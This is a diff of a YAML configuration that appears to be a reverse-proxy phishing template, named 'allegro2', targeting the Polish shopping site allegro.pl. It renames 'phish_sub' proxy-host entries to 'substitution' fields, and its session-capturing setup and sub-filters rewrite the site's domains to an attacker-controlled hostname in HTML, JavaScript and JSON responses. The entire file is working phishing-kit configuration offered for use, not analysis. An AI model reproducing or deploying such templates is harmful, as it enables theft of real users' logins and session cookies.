@@ -2,10 +2,10 @@ creator: '@hash3liZer'
 name: 'allegro2'
 proto: 'http'
 
-proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'allegro.pl', session: true, is_landing: true, auto_filter: false}
-  - {phish_sub: 'edge', orig_sub: 'edge', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
+subdomains:
+  - {substitution: '', original: '', domain: 'allegro.pl'}
+  - {substitution: 'www', original: 'www', domain: 'allegro.pl'}
+  
 sub_filters:
   - {triggers_on: 'www.allegro.pl', orig_sub: 'www', domain: 'allegro.pl', search: 'www.allegro.pl', replace: 'www.{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'www.allegro.pl', orig_sub: 'www', domain: 'allegro.pl', search: 'edge.allegro.pl', replace: 'edge.{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
